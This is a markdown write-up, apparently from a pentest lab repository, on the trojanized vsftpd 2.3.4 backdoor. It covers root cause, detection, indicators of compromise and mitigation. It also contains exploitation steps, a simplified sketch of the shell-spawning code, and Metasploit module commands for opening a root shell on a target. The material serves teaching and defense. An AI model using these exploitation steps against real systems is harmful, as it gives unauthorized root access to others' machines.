# vsftpd 2.3.4 Backdoor Vulnerability

## Overview
The `vsftpd 2.3.4` backdoor vulnerability is a **deliberate backdoor** introduced into a **trojanized version** of the `vsftpd` (Very Secure FTP Daemon) source code. This backdoor was **not a coding mistake**, but a **malicious modification** uploaded to the main distribution server in July 2011.

When exploited, it results in a **root shell being spawned** on the affected system and **bound to TCP port 6200**.

---

## Root Cause
The vulnerability is not a buffer overflow or traditional code bug. It is a result of **malicious logic added to the vsftpd source code**.

The altered code checks for usernames that contain the smiley face `:)`. If this condition is met, a shell is spawned and a socket is opened on **TCP port 6200**.

### Malicious Code Logic (Simplified)
```c
if (strstr(user_input, ":)") != NULL) {
    int sock = socket(...);
    bind(sock, 6200);
    listen(sock, 1);
    ...
    dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
    execve("/bin/sh", ...);
}
```

---

## Exploitation Details

### Prerequisites
- Target is running the **backdoored version of vsftpd 2.3.4** (not the official source).
- Attacker has **network access** to the FTP port (usually 21).

### Exploit Behavior
1. The attacker connects to the FTP server and sends a **username** containing `:)`.
2. The server triggers the backdoor logic.
3. A **shell is spawned** and listens on TCP **port 6200**.
4. The attacker then connects to `port 6200` to gain **root access** to the system.

### Metasploit Module
Path: `exploit/unix/ftp/vsftpd_234_backdoor`

Usage:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target IP>
set RPORT 21
exploit
```

If successful:
```
[*] Backdoor service has been spawned, handling...
[*] Found shell.
[*] Command shell session opened...
```

---

## Detection & Analysis

### Manual Check
- Use `nmap` to identify vsftpd 2.3.4:
```bash
nmap -sV -p 21 <target>
```

- Use `Wireshark` to inspect outgoing connections from the victim to TCP port 6200.
Filter:
```
ip.addr == <victim_IP> && tcp.port == 6200
```

### Indicators of Compromise (IoC)
- Presence of `vsftpd 2.3.4` with checksum mismatch.
- Unexpected service listening on **port 6200**.
- Suspicious shell traffic over unusual ports.

---

## Mitigation
- Replace the `vsftpd` binary with a trusted version (e.g. from official package managers).
- Block outbound traffic to untrusted destinations (especially port 6200).
- Conduct forensic analysis if compromise is suspected.

---

## Real-World Impact

While no widespread attacks were publicly documented, the backdoor in vsftpd 2.3.4 provided a real root shell via TCP 6200. A limited number of systems that compiled the trojanized version were likely exposed. This case raised global awareness of the risks in open-source distribution and software supply chains.

---

## Summary
The `vsftpd 2.3.4` backdoor is a notorious example of **software supply chain compromise**. It emphasizes the need for:

- Verifying file integrity (checksums, GPG signatures)
- Monitoring for unusual port usage (e.g. TCP 6200)
- Avoiding unofficial or outdated software sources

This backdoor is **not a traditional vulnerability**. It is a stark reminder that trust in software distribution can be exploited maliciously.

A full reproduction of this vulnerability is available in the following lab report:

ðŸ‘‰ [metasploit-vsftpd-exploit.md â€“ pentest-labs GitHub repository](https://github.com/lorenzococcia/pentest-labs/blob/tools/metasploit/metasploit-vsftpd-exploit.md) It is a stark reminder that trust in software distribution can be exploited maliciously.

